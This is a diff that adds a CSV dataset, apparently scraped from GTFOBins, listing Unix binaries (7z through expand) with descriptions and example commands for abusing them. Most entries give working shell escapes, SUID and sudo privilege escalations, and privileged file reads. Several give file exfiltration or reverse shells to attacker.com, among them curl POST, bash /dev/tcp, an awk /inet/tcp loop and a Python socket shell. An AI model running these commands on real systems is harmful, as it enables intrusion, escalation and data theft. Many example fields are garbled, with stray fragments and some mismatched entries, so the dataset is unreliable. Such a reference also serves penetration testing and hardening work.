@@ -1,0 +1,967 @@
+Binary Name,URL,Description,Functions,Examples
+7z,https://gtfobins.github.io/gtfobins/7z/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; Sudo,"LFILE=file_to_read
+7z a -ttar -an -so $LFILE | 7z e -ttar -si -so; sudo; LFILE=file_to_read
+sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
+aa-exec,https://gtfobins.github.io/gtfobins/aa-exec/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,aa-exec /bin/sh; sh -p; -p
+ab,https://gtfobins.github.io/gtfobins/ab/,It can exfiltrate files on the network.,File upload; File download; SUID; Sudo,"URL=http://attacker.com/
+LFILE=file_to_send
+ab -p $LFILE $URL; URL=http://attacker.com/file_to_download
+ab -v2 $URL; sh -p"
+agetty,https://gtfobins.github.io/gtfobins/agetty/,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",SUID,sh -p; -p; sh
+alpine,https://gtfobins.github.io/gtfobins/alpine/,"The file is displayed in the alpine curses terminal interface. Other options might be available, for example by pressing S is possible to save the file content elsewhere.",File read; SUID; Sudo,"alpine; S; LFILE=file_to_read
+alpine -F ""$LFILE"""
+ansible-playbook,https://gtfobins.github.io/gtfobins/ansible-playbook/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"TF=$(mktemp)
+echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
+ansible-playbook $TF; sudo; TF=$(mktemp)
+echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
+sudo ansible-playbook $TF"
+ansible-test,https://gtfobins.github.io/gtfobins/ansible-test/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,ansible-test shell; sudo; sudo ansible-test shell
+aoss,https://gtfobins.github.io/gtfobins/aoss/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,aoss /bin/sh; sudo; sudo aoss /bin/sh
+apache2ctl,https://gtfobins.github.io/gtfobins/apache2ctl/,"This includes the file in the actual configuration file, the first line is leaked as an error message.",File read; Sudo,"LFILE=file_to_read
+apache2ctl -c ""Include $LFILE"" -k stop; sudo; LFILE=file_to_read
+sudo apache2ctl -c ""Include $LFILE"" -k stop"
+apt-get,https://gtfobins.github.io/gtfobins/apt-get/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; apt-get changelog apt
+!/bin/sh; sudo"
+apt,https://gtfobins.github.io/gtfobins/apt/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; apt changelog apt
+!/bin/sh; sudo"
+ar,https://gtfobins.github.io/gtfobins/ar/,The file appears amid the binary content of the archive.,File read; SUID; Sudo,"TF=$(mktemp -u)
+LFILE=file_to_read
+ar r ""$TF"" ""$LFILE""
+cat ""$TF""; sh -p; -p"
+aria2c,https://gtfobins.github.io/gtfobins/aria2c/,Note that the subprocess is immediately sent to the background.,Command; File download; Sudo; Limited SUID,"COMMAND='id'
+TF=$(mktemp)
+echo ""$COMMAND"" > $TF
+chmod +x $TF
+aria2c --on-download-error=$TF http://x; aaaaaaaaaaaaaaaa; --allow-overwrite"
+arj,https://gtfobins.github.io/gtfobins/arj/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,"TF=$(mktemp -d)
+LFILE=file_to_write
+LDIR=where_to_write
+echo DATA >""$TF/$LFILE""
+arj a ""$TF/a"" ""$TF/$LFILE""
+arj e ""$TF/a"" $LDIR; TF=$(mktemp -u)
+LFILE=file_to_read
+arj a ""$TF"" ""$LFILE""
+arj p ""$TF""; sh -p"
+arp,https://gtfobins.github.io/gtfobins/arp/,The read file content is corrupted by error prints.,File read; SUID; Sudo,"LFILE=file_to_read
+arp -v -f ""$LFILE""; sh -p; -p"
+as,https://gtfobins.github.io/gtfobins/as/,"The file content is treated as command line options and disclosed throught error messages, so this is not suitable to read arbitrary binary data.",File read; SUID; Sudo,"LFILE=file_to_read
+as @$LFILE; sh -p; -p"
+ascii-xfr,https://gtfobins.github.io/gtfobins/ascii-xfr/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+ascii-xfr -ns ""$LFILE""; sh -p; -p"
+ascii85,https://gtfobins.github.io/gtfobins/ascii85/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; Sudo,"LFILE=file_to_read
+ascii85 ""$LFILE"" | ascii85 --decode; sudo; LFILE=file_to_read
+sudo ascii85 ""$LFILE"" | ascii85 --decode"
+ash,https://gtfobins.github.io/gtfobins/ash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"ash; export LFILE=file_to_write
+ash -c 'echo DATA > $LFILE'; sh -p"
+aspell,https://gtfobins.github.io/gtfobins/aspell/,The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.,File read; SUID; Sudo,"LFILE=file_to_read
+aspell -c ""$LFILE""; sh -p; -p"
+at,https://gtfobins.github.io/gtfobins/at/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; Sudo,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null; COMMAND=id
+echo ""$COMMAND"" | at now; sudo"
+atobm,https://gtfobins.github.io/gtfobins/atobm/,"Outputs the first line of the file to standard error without the - and # characters, this can be customized with the -c option, by default is -c -#.",File read; SUID; Sudo,-; #; -c
+awk,https://gtfobins.github.io/gtfobins/awk/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Non-interactive bind shell; File write; File read; SUID; Sudo; Limited SUID,"awk 'BEGIN {system(""/bin/sh"")}'; nc -l -p 12345; RHOST=attacker.com
+RPORT=12345
+awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
+    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
+    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
+    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
+aws,https://gtfobins.github.io/gtfobins/aws/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; aws help
+!/bin/sh; sudo"
+base32,https://gtfobins.github.io/gtfobins/base32/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+base32 ""$LFILE"" | base32 --decode; sh -p; -p"
+base58,https://gtfobins.github.io/gtfobins/base58/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; Sudo,"LFILE=file_to_read
+base58 ""$LFILE"" | base58 --decode; sudo; LFILE=file_to_read
+sudo base58 ""$LFILE"" | base58 --decode"
+base64,https://gtfobins.github.io/gtfobins/base64/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+base64 ""$LFILE"" | base64 --decode; sh -p; -p"
+basenc,https://gtfobins.github.io/gtfobins/basenc/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+basenc --base64 $LFILE | basenc -d --base64; sh -p; -p"
+basez,https://gtfobins.github.io/gtfobins/basez/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+basez ""$LFILE"" | basez --decode; sh -p; -p"
+bash,https://gtfobins.github.io/gtfobins/bash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; SUID; Sudo,"bash; nc -l -p 12345; export RHOST=attacker.com
+export RPORT=12345
+bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'"
+batcat,https://gtfobins.github.io/gtfobins/batcat/,"This invokes the default pager, which is likely to be less, other functions may apply. --paging always can be omitted provided that the output doesn’t fit the screen.",Shell; Sudo; Limited SUID,"less; --paging always; batcat --paging always /etc/profile
+!/bin/sh"
+bc,https://gtfobins.github.io/gtfobins/bc/,"The file content is actually parsed and appears as error messages, thus it might not be suitable to read arbitray binary files.",File read; SUID; Sudo,"LFILE=file_to_read
+bc -s $LFILE
+quit; sh -p; -p"
+bconsole,https://gtfobins.github.io/gtfobins/bconsole/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"bconsole
+@exec /bin/sh; bconsole -c /etc/shadow; sudo"
+bpftrace,https://gtfobins.github.io/gtfobins/bpftrace/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'; TF=$(mktemp)
+echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF
+sudo bpftrace $TF"
+bridge,https://gtfobins.github.io/gtfobins/bridge/,Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.,File read; SUID; Sudo,"LFILE=file_to_read
+bridge -b ""$LFILE""; sh -p; -p"
+bundle,https://gtfobins.github.io/gtfobins/bundle/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; bundle help
+!/bin/sh; export BUNDLE_GEMFILE=x
+bundle exec /bin/sh"
+bundler,https://gtfobins.github.io/gtfobins/bundler/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; bundler help
+!/bin/sh; export BUNDLE_GEMFILE=x
+bundler exec /bin/sh"
+busctl,https://gtfobins.github.io/gtfobins/busctl/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"less; busctl --show-machine
+!/bin/sh; busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
+busybox,https://gtfobins.github.io/gtfobins/busybox/,"BusyBox may contain many UNIX utilities, run busybox --list-full to check what GTFOBins binaries are supported. Here some example.",Shell; Reverse shell; File upload; File write; File read; SUID; Sudo,busybox --list-full; busybox sh; nc -lvp 12345
+byebug,https://gtfobins.github.io/gtfobins/byebug/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"TF=$(mktemp)
+echo 'system(""/bin/sh"")' > $TF
+byebug $TF
+continue; sudo; TF=$(mktemp)
+echo 'system(""/bin/sh"")' > $TF
+sudo byebug $TF
+continue"
+bzip2,https://gtfobins.github.io/gtfobins/bzip2/,"There are also a number of other utilities that rely on bzip2 under the hood, e.g., bzless, bzcat, bunzip2, etc. Besides having similar features, they also allow privileged reads if bzip2 itself is SUID.",File read; SUID; Sudo,bzip2; bzless; bzcat
+c89,https://gtfobins.github.io/gtfobins/c89/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"c89 -wrapper /bin/sh,-s .; LFILE=file_to_delete
+c89 -xc /dev/null -o $LFILE; LFILE=file_to_read
+c89 -x c -E ""$LFILE"""
+c99,https://gtfobins.github.io/gtfobins/c99/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"c99 -wrapper /bin/sh,-s .; LFILE=file_to_delete
+c99 -xc /dev/null -o $LFILE; LFILE=file_to_read
+c99 -x c -E ""$LFILE"""
+cabal,https://gtfobins.github.io/gtfobins/cabal/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,cabal exec -- /bin/sh; sh -p; -p
+cancel,https://gtfobins.github.io/gtfobins/cancel/,It can exfiltrate files on the network.,File upload,"nc -l -p 12345 > ""file_to_save""; RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_send
+cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT"
+capsh,https://gtfobins.github.io/gtfobins/capsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,capsh --; sh -p; -p
+cat,https://gtfobins.github.io/gtfobins/cat/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+cat ""$LFILE""; sh -p; -p"
+cdist,https://gtfobins.github.io/gtfobins/cdist/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,cdist shell -s /bin/sh; sudo; sudo cdist shell -s /bin/sh
+certbot,https://gtfobins.github.io/gtfobins/certbot/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"TF=$(mktemp -d)
+certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'; sudo; TF=$(mktemp -d)
+sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
+check_by_ssh,https://gtfobins.github.io/gtfobins/check_by_ssh/,"This is the check_by_ssh Nagios plugin, available e.g. in /usr/lib/nagios/plugins/.",Shell; Sudo,check_by_ssh; /usr/lib/nagios/plugins/; 2.4.5
+check_cups,https://gtfobins.github.io/gtfobins/check_cups/,"This is the check_cups Nagios plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line.",File read; Sudo,"check_cups; /usr/lib/nagios/plugins/; LFILE=file_to_read
+check_cups --extra-opts=@$LFILE"
+check_log,https://gtfobins.github.io/gtfobins/check_log/,"This is the check_log Nagios plugin, available e.g. in /usr/lib/nagios/plugins/.",File write; File read; Sudo,"check_log; /usr/lib/nagios/plugins/; LFILE=file_to_write
+INPUT=input_file
+check_log -F $INPUT -O $LFILE"
+check_memory,https://gtfobins.github.io/gtfobins/check_memory/,"This is the check_memory Nagios plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line.",File read; Sudo,"check_memory; /usr/lib/nagios/plugins/; LFILE=file_to_read
+check_memory --extra-opts=@$LFILE"
+check_raid,https://gtfobins.github.io/gtfobins/check_raid/,"This is the check_raid Nagios plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line.",File read; Sudo,"check_raid; /usr/lib/nagios/plugins/; LFILE=file_to_read
+check_raid --extra-opts=@$LFILE"
+check_ssl_cert,https://gtfobins.github.io/gtfobins/check_ssl_cert/,"This is the check_by_ssh Nagios plugin, available e.g. in /usr/lib/nagios/plugins/.",Command; Sudo,"check_by_ssh; /usr/lib/nagios/plugins/; COMMAND=id
+OUTPUT=output_file
+TF=$(mktemp)
+echo ""$COMMAND | tee $OUTPUT"" > $TF
+chmod +x $TF
+check_ssl_cert --curl-bin $TF -H example.net
+cat $OUTPUT"
+check_statusfile,https://gtfobins.github.io/gtfobins/check_statusfile/,"This is the check_statusfile Nagios plugi plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line.",File read; Sudo,"check_statusfile; /usr/lib/nagios/plugins/; LFILE=file_to_read
+check_statusfile $LFILE"
+chmod,https://gtfobins.github.io/gtfobins/chmod/,"This can be run with elevated privileges to change permissions (6 denotes the SUID bits) and then read, write, or execute a file.",SUID; Sudo,6; sh -p; -p
+choom,https://gtfobins.github.io/gtfobins/choom/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,choom -n 0 /bin/sh; sh -p; -p
+chown,https://gtfobins.github.io/gtfobins/chown/,"This can be run with elevated privileges to change ownership and then read, write, or execute a file.",SUID; Sudo,sh -p; -p; sh
+chroot,https://gtfobins.github.io/gtfobins/chroot/,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",SUID; Sudo,sh -p; -p; sh
+clamscan,https://gtfobins.github.io/gtfobins/clamscan/,"Each line of the file is interpreted as a path and the content is leaked via error messages, thus this might not be suitable to read binary files. The output can optionally be cleaned using sed.",File read; SUID; Sudo,"sed; LFILE=file_to_read
+TF=$(mktemp -d)
+touch $TF/empty.yara
+clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'; sh -p"
+cmp,https://gtfobins.github.io/gtfobins/cmp/,"Dump the bytes of the input file that are different from the NUL byte in a tabular format, hence this may not be suitable to read arbitrary binary files.",File read; SUID; Sudo,"LFILE=file_to_read
+cmp $LFILE /dev/zero -b -l; sh -p; -p"
+cobc,https://gtfobins.github.io/gtfobins/cobc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"TF=$(mktemp -d)
+echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
+cobc -xFj --frelax-syntax-checks $TF/x; sudo; TF=$(mktemp -d)
+echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
+sudo cobc -xFj --frelax-syntax-checks $TF/x"
+column,https://gtfobins.github.io/gtfobins/column/,column expects textual data.,File read; SUID; Sudo,"column; LFILE=file_to_read
+column $LFILE; sh -p"
+comm,https://gtfobins.github.io/gtfobins/comm/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+comm $LFILE /dev/null 2>/dev/null; sh -p; -p"
+composer,https://gtfobins.github.io/gtfobins/composer/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"TF=$(mktemp -d)
+echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
+composer --working-dir=$TF run-script x; sudo; TF=$(mktemp -d)
+echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
+sudo composer --working-dir=$TF run-script x"
+cowsay,https://gtfobins.github.io/gtfobins/cowsay/,"It allows to execute perl code, other functions may apply.",Shell; Sudo,"perl; TF=$(mktemp)
+echo 'exec ""/bin/sh"";' >$TF
+cowsay -f $TF x; sudo"
+cowthink,https://gtfobins.github.io/gtfobins/cowthink/,"It allows to execute perl code, other functions may apply.",Shell; Sudo,"perl; TF=$(mktemp)
+echo 'exec ""/bin/sh"";' >$TF
+cowthink -f $TF x; sudo"
+cp,https://gtfobins.github.io/gtfobins/cp/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,"LFILE=file_to_write
+echo ""DATA"" | cp /dev/stdin ""$LFILE""; LFILE=file_to_read
+cp ""$LFILE"" /dev/stdout; sh -p"
+cpan,https://gtfobins.github.io/gtfobins/cpan/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; Sudo,"cpan; ! command; cpan
+! exec '/bin/bash'"
+cpio,https://gtfobins.github.io/gtfobins/cpio/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"echo '/bin/sh </dev/tty >/dev/tty' >localhost
+cpio -o --rsh-command /bin/sh -F localhost:; $LFILE; $LDIR"
+cpulimit,https://gtfobins.github.io/gtfobins/cpulimit/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,cpulimit -l 100 -f /bin/sh; sh -p; -p
+crash,https://gtfobins.github.io/gtfobins/crash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; Sudo,"less; crash -h
+!sh; COMMAND='/usr/bin/id'
+CRASHPAGER=""$COMMAND"" crash -h"
+crontab,https://gtfobins.github.io/gtfobins/crontab/,It can be used to break out from restricted environments by running non-interactive system commands.,Command; Sudo,crontab; crontab -e; sudo
+csh,https://gtfobins.github.io/gtfobins/csh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"csh; export LFILE=file_to_write
+ash -c 'echo DATA > $LFILE'; sh -p"
+csplit,https://gtfobins.github.io/gtfobins/csplit/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,xx0file_to_write; -f; xx
+csvtool,https://gtfobins.github.io/gtfobins/csvtool/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"csvtool call '/bin/sh;false' /etc/passwd; LFILE=file_to_write
+TF=$(mktemp)
+echo DATA > $TF
+csvtool trim t $TF -o $LFILE; LFILE=file_to_read
+csvtool trim t $LFILE"
+cupsfilter,https://gtfobins.github.io/gtfobins/cupsfilter/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+cupsfilter -i application/octet-stream -m application/octet-stream $LFILE; sh -p; -p"
+curl,https://gtfobins.github.io/gtfobins/curl/,It can exfiltrate files on the network.,File upload; File download; File write; File read; SUID; Sudo,"@; URL=http://attacker.com/
+LFILE=file_to_send
+curl -X POST -d ""@$LFILE"" $URL; URL=http://attacker.com/file_to_get
+LFILE=file_to_save
+curl $URL -o $LFILE"
+cut,https://gtfobins.github.io/gtfobins/cut/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+cut -d """" -f1 ""$LFILE""; sh -p; -p"
+dash,https://gtfobins.github.io/gtfobins/dash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"dash; export LFILE=file_to_write
+dash -c 'echo DATA > $LFILE'; sh -p"
+date,https://gtfobins.github.io/gtfobins/date/,"Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.",File read; SUID; Sudo,"date; LFILE=file_to_read
+date -f $LFILE; sh -p"
+dc,https://gtfobins.github.io/gtfobins/dc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,dc -e '!/bin/sh'; sudo; sudo dc -e '!/bin/sh'
+dd,https://gtfobins.github.io/gtfobins/dd/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,"LFILE=file_to_write
+echo ""DATA"" | dd of=$LFILE; LFILE=file_to_read
+dd if=$LFILE; sh -p"
+debugfs,https://gtfobins.github.io/gtfobins/debugfs/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"debugfs
+!/bin/sh; sh -p; -p"
+dialog,https://gtfobins.github.io/gtfobins/dialog/,"The file is shown in an interactive TUI dialog, thus it is not suitable for binary/too big data.",File read; SUID; Sudo,"LFILE=file_to_read
+dialog --textbox ""$LFILE"" 0 0; sh -p; -p"
+diff,https://gtfobins.github.io/gtfobins/diff/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+diff --line-format=%L /dev/null $LFILE; $TF; LFOLDER=folder_to_list
+TF=$(mktemp -d)
+diff --recursive $TF $LFOLDER"
+dig,https://gtfobins.github.io/gtfobins/dig/,"Each input line is treated as a lookup query for the dig command and the output is corrupted with the result or errors of the operation, so this may not be suitable for binary files. Grepping for DiG might help to filter out unwanted content.",File read; SUID; Sudo,"dig; DiG; LFILE=file_to_read
+dig -f $LFILE"
+distcc,https://gtfobins.github.io/gtfobins/distcc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,distcc /bin/sh; sh -p; -p
+dmesg,https://gtfobins.github.io/gtfobins/dmesg/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"less; dmesg -H
+!/bin/sh; LFILE=file_to_read
+dmesg -rF ""$LFILE"""
+dmidecode,https://gtfobins.github.io/gtfobins/dmidecode/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,sudo; --dump-bin; --no-sysfs
+dmsetup,https://gtfobins.github.io/gtfobins/dmsetup/,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",SUID; Sudo,sh -p; -p; sh
+dnf,https://gtfobins.github.io/gtfobins/dnf/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; TF=$(mktemp -d)
+echo 'id' > $TF/x.sh
+fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF; sudo dnf install -y x-1.0-1.noarch.rpm"
+docker,https://gtfobins.github.io/gtfobins/docker/,"This requires the user to be privileged enough to run docker, i.e. being in the docker group or being root.",Shell; File write; File read; SUID; Sudo,docker; root; debian
+dos2unix,https://gtfobins.github.io/gtfobins/dos2unix/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write,"LFILE1=file_to_read
+LFILE2=file_to_write
+dos2unix -f -n ""$LFILE1"" ""$LFILE2"""
+dosbox,https://gtfobins.github.io/gtfobins/dosbox/,"Basically dosbox allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention (8.3) is used.",File write; File read; SUID; Sudo,dosbox; FILE_TO_; echo
+dotnet,https://gtfobins.github.io/gtfobins/dotnet/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"dotnet fsi
+System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;; export LFILE=file_to_read
+dotnet fsi
+System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;; sudo"
+dpkg,https://gtfobins.github.io/gtfobins/dpkg/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; dpkg -l
+!/bin/sh; sudo"
+dstat,https://gtfobins.github.io/gtfobins/dstat/,dstat allows you to run arbitrary python scripts loaded as “external plugins” if they are located in one of the directories stated in the dstat man page under “FILES”:,Shell; Sudo,dstat; python; ~/.dstat/
+dvips,https://gtfobins.github.io/gtfobins/dvips/,The texput.dvi output file produced by tex can be created offline and uploaded to the target.,Shell; Sudo; Limited SUID,"texput.dvi; tex; tex '\special{psfile=""`/bin/sh 1>&0""}\end'
+dvips -R0 texput.dvi"
+easy_install,https://gtfobins.github.io/gtfobins/easy_install/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; Sudo,"TF=$(mktemp -d)
+echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
+easy_install $TF; socat file:`tty`,raw,echo=0 tcp-listen:12345; export RHOST=attacker.com
+export RPORT=12345
+TF=$(mktemp -d)
+echo 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn(""/bin/sh"")' > $TF/setup.py
+easy_install $TF"
+eb,https://gtfobins.github.io/gtfobins/eb/,"This invokes the default logging service, which is likely to be journalctl, other functions may apply. For this to work the target must be connected to AWS instance via EB-CLI.",Shell; Sudo,"journalctl; eb logs
+!/bin/sh; sudo"
+ed,https://gtfobins.github.io/gtfobins/ed/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo; Limited SUID,"ed
+!/bin/sh; ed file_to_write
+a
+DATA
+.
+w
+q; ed file_to_read
+,p
+q"
+efax,https://gtfobins.github.io/gtfobins/efax/,"The content is actually parsed by the command, thus it may not be suitable for reading arbitrary files.",SUID; Sudo,sh -p; -p; sh
+elvish,https://gtfobins.github.io/gtfobins/elvish/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"elvish; export LFILE=file_to_write
+elvish -c 'echo DATA >$E:LFILE'; export LFILE=file_to_read
+elvish -c 'echo (slurp <$E:LFILE)'"
+emacs,https://gtfobins.github.io/gtfobins/emacs/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"emacs -Q -nw --eval '(term ""/bin/sh"")'; emacs file_to_write
+DATA
+C-x C-s; emacs file_to_read"
+enscript,https://gtfobins.github.io/gtfobins/enscript/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,enscript /dev/null -qo /dev/null -I '/bin/sh >&2'; sudo; sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
+env,https://gtfobins.github.io/gtfobins/env/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,env /bin/sh; sh -p; -p
+eqn,https://gtfobins.github.io/gtfobins/eqn/,"The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",File read; SUID; Sudo,"LFILE=file_to_read
+eqn ""$LFILE""; sh -p; -p"
+espeak,https://gtfobins.github.io/gtfobins/espeak/,"The file content appears in the middle of other textual information, thus it might not be suitable to read arbitray binary files.",File read; SUID; Sudo,"LFILE=file_to_read
+espeak -qXf ""$LFILE""; sh -p; -p"
+ex,https://gtfobins.github.io/gtfobins/ex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"ex
+!/bin/sh; ex file_to_write
+a
+DATA
+.
+w
+q; ex file_to_read
+,p
+q"
+exiftool,https://gtfobins.github.io/gtfobins/exiftool/,"If the permissions allow it, files are moved (instead of copied) to the destination.",File write; File read; Sudo,"LFILE=file_to_write
+INPUT=input_file
+exiftool -filename=$LFILE $INPUT; LFILE=file_to_read
+OUTPUT=output_file
+exiftool -filename=$OUTPUT $LFILE
+cat $OUTPUT; sudo"
+expand,https://gtfobins.github.io/gtfobins/expand/,The read file content is corrupted by replacing tabs with spaces.,File read; SUID; Sudo,"LFILE=file_to_read
+expand ""$LFILE""; sh -p; -p"
